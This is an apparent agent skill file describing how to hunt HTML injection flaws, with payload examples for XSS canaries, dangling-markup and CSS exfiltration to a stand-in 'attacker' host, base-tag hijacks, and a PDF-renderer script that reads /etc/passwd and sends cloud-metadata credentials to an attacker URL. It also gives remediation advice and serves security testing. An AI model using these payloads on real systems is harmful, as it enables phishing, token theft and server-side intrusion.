---
name: hunt-html-injection
description: "Hunt HTML Injection — user-supplied input is rendered as raw HTML in the response without sanitisation, allowing an attacker to inject arbitrary HTML tags (but not necessarily JavaScript). Lower severity than XSS but enables phishing, UI manipulation, and credential harvesting via injected forms. Use when testing text-display surfaces (search results, profile fields, comments, error messages, feedback forms). For markup that executes JavaScript, escalate to hunt-xss."
sources: hackerone_public, public_research, portswigger_research
report_count: 6
cwe: [CWE-79, CWE-80, CWE-116, CWE-83]
cvss_baseline: "Low (3.1-4.3) UI defacement / reflected markup → Medium (5.4-6.1) phishing form / dangling-markup token theft / stored in other users' view → High (7.x+) when it escalates to XSS or server-side (PDF/headless) SSRF/LFI."
related_skills: [hunt-xss, hunt-ssrf, hunt-lfi, hunt-open-redirect, hunt-dom]
---

## What is HTML Injection

HTML Injection occurs when user input is inserted into a page's HTML without escaping, so injected tags are rendered by the browser as markup rather than displayed as literal text. Unlike XSS, the injected content does not require JavaScript execution — injecting `<b>`, `<h1>`, `<a>`, `<img>`, or `<form>` tags is sufficient.

**To PROVE impact unambiguously, escalate to an active vector carrying a unique numeric canary** — e.g. `"><img src=x onerror=alert(91234)>` or `<svg onload=alert(91234)>`. A distinctive 4+ digit number (not `alert(1)`) distinguishes YOUR reflected injection from the example payloads practice pages embed in their own hint text. Proof = the raw, unescaped vector with your canary appears in the response.

**Impact:**
- Phishing via injected `<form>` or `<a href="attacker.com">` tags
- UI defacement — `<h1>HACKED</h1>` renders visually on the page
- Credential harvesting via injected login forms
- Redirect via `<meta http-equiv="refresh">`
- Stepping stone to XSS (may be blocked by WAF on `<script>` but not `<img onerror>`)
- **Dangling-markup exfiltration** — even with `<script>` and event handlers filtered, an *unterminated* tag can capture page content that follows it. Inject `<img src='//attacker.tld/log?html=` (no closing quote/`>`); the browser treats everything up to the next `'` as the URL, leaking any CSRF token, secret, or PII rendered after your injection point to your server. Works where full XSS is blocked but raw `<` is reflected.
- **Email/notification-context injection** — a field reflected unescaped into a transactional email (signup confirmation, admin alert, support-chat transcript) renders injected `<a>`/`<img>`/dangling markup in the *recipient's* inbox — an audience the web UI can't reach, and often the only place HTML is rendered unfiltered. Inject into name/subject/comment, then read the raw email source. Disclosed class: <https://hackerone.com/reports/1935628>, <https://hackerone.com/reports/3556892>.

## Attack Surface

Any input that is reflected or stored and then displayed in an HTML context:
- Search boxes (`?q=`)
- Comments, feedback, reviews
- Profile fields (name, bio, username)
- Error messages (`?error=`, `?message=`)
- Subject / body of contact forms
- Admin-visible fields (ticket titles, usernames in logs)

## Autonomous Testing Priority

**Inject a recognisable HTML tag with a unique canary string. Unescaped angle brackets in the response = confirmed injection.**

**Pattern 1 — Basic HTML tag injection:**
```
<b>CANARY</b>
"><b>CANARY</b>
```
Use a unique string as CANARY (something distinct to this test run). **Proof:** the response contains `<b>CANARY` with literal `<` angle brackets — not `&lt;b&gt;CANARY`. A properly encoded app would escape `<` to `&lt;`.

**Try multiple tag types when `<b>` is filtered:**
- `<h1>CANARY</h1>` — heading tag (often less filtered)
- `<img src=x onerror=CANARY>` — attribute context
- `<a href="https://attacker.com">click</a>` — link injection (phishing proof)

**For stored injection:** inject into the storage endpoint, then GET the page where the value is displayed and check for unescaped tags.

**Escalate immediately:** if `<b>` injection works, try `<script>alert(1)</script>` — the same unsanitised input may allow full XSS.

## Proof

Confirmed when your injected tag appears in the response body with literal `<` angle brackets (not HTML-encoded). A safe app renders `&lt;b&gt;CANARY&lt;/b&gt;`; a vulnerable app renders `<b>CANARY</b>`.

## Distinguishing HTML Injection from XSS

- HTML injection: `<b>text</b>` renders as **text** in the browser — no JS execution needed.
- XSS: `<script>alert(1)</script>` executes JavaScript.

Some WAFs block `<script>` but pass `<b>` or `<img>` — start with non-script tags, then escalate.

---

## New Techniques (2024-2026)

### Server-side HTML injection into PDF / headless-Chrome renderers → SSRF / LFI
The highest-impact version of this class. When your injected HTML is rendered **server-side** into a PDF (invoices, reports, tickets) or a screenshot via `wkhtmltopdf`, Puppeteer/Playwright, or a headless browser, inject tags that make the *server* fetch resources:
```html
<iframe src="file:///etc/passwd"></iframe>
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<link rel="attachment" href="file:///etc/passwd">
<script>fetch('http://169.254.169.254/...').then(r=>r.text()).then(t=>location='http://attacker/?'+t)</script>  <!-- if JS runs in the renderer -->
```
If the PDF contents include the file/metadata, you have **server-side SSRF/LFI** from an "HTML injection". Cross-ref `hunt-ssrf`, `hunt-lfi`. This frequently outranks any client-side impact.

### Markdown injection → HTML/XSS
Apps that render user Markdown to HTML often allow raw HTML passthrough or mishandle links/images:
```
[click](javascript:alert(1))
![x](https://attacker/ssrf)                 <!-- server-side image fetch = SSRF -->
<img src=x onerror=alert(91234)>            <!-- raw HTML passthrough -->
[a](<javascript:alert(1)>)   or   [a](java&#115;cript:alert(1))
```
Image references in server-rendered Markdown are a common blind-SSRF vector.

### CSS injection — data exfil without JS
If you can inject `<style>` or style attributes but scripts are blocked, exfiltrate token/secret text via attribute-selector + background-image:
```html
<style>input[name=csrf][value^="a"]{background:url(//attacker/a)}</style>  <!-- leak char by char -->
```
Also `@import` and font-based exfil. Works under strict CSP that still allows inline styles.

### Dangling-markup exfiltration under CSP
(Expanded from the impact list.) When `<script>`/handlers are filtered but raw `<` is reflected, an unterminated attribute captures everything up to the next quote/`>`:
```html
<img src='//attacker/log?html=
```
Everything after — CSRF token, PII, secrets — is sent to the attacker. One of the few reliable CSP bypasses for reflected injection.

### Reverse tabnabbing via injected link
Injected `<a href="//attacker" target="_blank">` (without `rel=noopener`) lets the attacker page rewrite the opener via `window.opener.location` → phishing redirect of the original tab. Medium-severity standalone.

### Meta-refresh / base-tag hijack
```html
<meta http-equiv="refresh" content="0;url=//attacker">   <!-- forced redirect -->
<base href="//attacker/">                                 <!-- rebase all relative URLs/forms -->
```
An injected `<base>` can redirect every relative form POST (including login) to the attacker.

### Encoding / charset bypass
If `<`/`>` are encoded but the page lacks an explicit charset, try UTF-7 (`+ADw-`), overlong UTF-8, or mutated-XML contexts. Also test where the sink is an attribute (`"`-break) vs element text.

## Tooling

- **Burp** — reflect a unique numeric canary; grep the response for literal `<canary` vs `&lt;canary`.
- **Headless-render targets** — generate the PDF/screenshot and open it; check whether `file://`/`169.254.169.254` content appears (SSRF/LFI proof).
- **dalfox / XSS Hunter** — once you confirm raw-HTML passthrough, escalate to `hunt-xss` tooling.

## Remediation

- Context-aware output encoding (HTML-entity-encode `< > " ' &`) at every sink; prefer templating auto-escape.
- For rich text/Markdown, render through a strict allowlist sanitizer (DOMPurify client-side; server-side sanitizer for stored content) that strips raw HTML, `javascript:` URLs, and event handlers.
- For server-side PDF/headless rendering, disable `file://`, intranet, and metadata access; run the renderer network-isolated; sanitize the HTML before rendering.
- Set a strong CSP (no inline, no `data:`), `rel="noopener"` on user links, and an explicit `charset=utf-8`.

## Validation Gate

- **Confirmed** when the injected tag renders with literal `<` (not `&lt;`), or server-side fetch content appears in the PDF/screenshot.
- State the realized impact: phishing form, dangling-markup token capture (show the exfil request), SSRF/LFI content, or escalation to XSS — "angle brackets reflected" with no demonstrated effect is low/informational.
- Use a unique 4+ digit canary (`91234`), never `alert(1)`, so you don't claim a practice page's own hint text.

## Disclosed Report Patterns

Verify before quoting IDs/amounts.
- **HTML/markdown injection into server-side PDF → SSRF/LFI** — recurring high-value class on invoice/report generators.
- **Stored HTML injection in transactional emails** — e.g. HackerOne #1935628, #3556892-style (injected markup renders in the recipient's inbox).
- **Dangling-markup CSRF-token theft under CSP** — PortSwigger-documented technique seen in multiple disclosures.
